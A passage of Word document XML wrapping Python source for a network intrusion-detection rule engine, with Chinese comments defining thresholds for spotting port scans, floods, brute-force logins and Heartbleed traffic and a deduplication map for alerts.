        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  RuleEngine    在线引擎 = 单流规则 + 窗口规则（按源 IP / 目的端口索引的滑动窗口）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFFC1BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                两者共用一套去重域，见 SCOPE_OF。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2EB630">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47791DF4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>**规则不输出"置信度"。** `RuleHit.strength` 是"实测值 ÷ 阈值"，只表示超阈值多少倍，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649D066E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>不是概率。告警表里 `source='rule'` 的行按这个字段展示，看板也照这个措辞写，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732A32BF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>别把它混进与小模型的置信度对比里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A7A469">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7527F069">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FBF0F99">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C15BDAB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27912EE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from collections import OrderedDict, deque</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01000E9C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from dataclasses import dataclass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7A2D9B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from typing import Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A8B82E5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7334137A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 单流规则阈值。分两组：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648E9447">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ① 「数据集口径」的判别阈值，取自训练段（前 70%）各类的分位数，在测试段上评一次</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D1E2D5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#    （tools/rules_baseline.py）。改之前先重跑那个脚本，否则报告里的对照数字就对不上了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D502D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ② 「现场口径」的行为阈值，判的是速率/包数这类不依赖采集方式的量，线上用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C9FD37">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>PORTSCAN_MAX_DURATION = 1_000.0        # 微秒：端口扫描的单行流时长在 50 µs 量级</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C409518">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>DDOS_BWD_BYTES = 5_000.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3F6CB0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>DDOS_MAX_DURATION = 5e6                # 5 s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B3E3225">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>HULK_MIN_DURATION = 1e7                # 10 s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414EE8B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>HULK_MIN_FWD_PKTS = 5.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04761B5A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>PATATOR_MIN_FWD = 9.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3473B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>PATATOR_MIN_BWD = 15.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B38D790">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>PATATOR_MIN_DURATION = 1e6             # 1 s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1398C490">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61BB10D9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>FLOOD_PPS = 1000.0                     # Flow Packets/s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F86438">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>FLOOD_FWD_PKTS = 100.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD15402">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>SCAN_MAX_FWD_PKTS = 2.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67251432">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>HEARTBLEED_BWD_BYTES = 1000.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357BAB96">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>HEARTBLEED_MAX_PKTS = 3.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D1CE407">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BF955E4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 窗口规则阈值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="515918A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>WINDOW_S = 60.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F41258">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>PORT_SCAN_PORTS = 20        # 同一源在窗口内探过的不同目的端口数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9A43C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>PORT_SCAN_MAX_PKTS = 3.0    # 只把极短流算作探测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D8F17D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>SYN_FLOOD_CONNS = 50        # 同一目的端口上 SYN 置位、ACK 未置位的流数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407E0609">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>BRUTE_SHORT_PKTS = 12.0     # Patator 每次连接都很短：握手 + 一次认证 ≈ 10 个包</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A125155">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>BRUTE_CONNS = 30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4348EB08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="531966D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="376792DC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 去重域：同类判据落进同一个域，一次扫描/一次洪泛只报一条。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57569D07">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 值里 "scan" 按源 IP 归并，其余按目的（IP:端口）归并。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FEA9DB9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>SCOPE_OF = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D61E34E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "port_scan": "scan",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781CE6A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "portscan_short": "scan",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B07FAA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "scan_single": "scan",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DAF1E9D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "flood_single": "flood",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E18CED2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "hulk_long": "flood",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49560EF2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "ddos_burst": "flood",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6307AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "syn_flood": "flood",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD9B7B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "patator_short": "brute",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28504B2E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "brute_force": "brute",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0F9CC0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA99C22">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A950390">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7649B0EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@dataclass(frozen=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2584DF34">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class RuleHit:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73552AE3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rule: str</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E39903">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
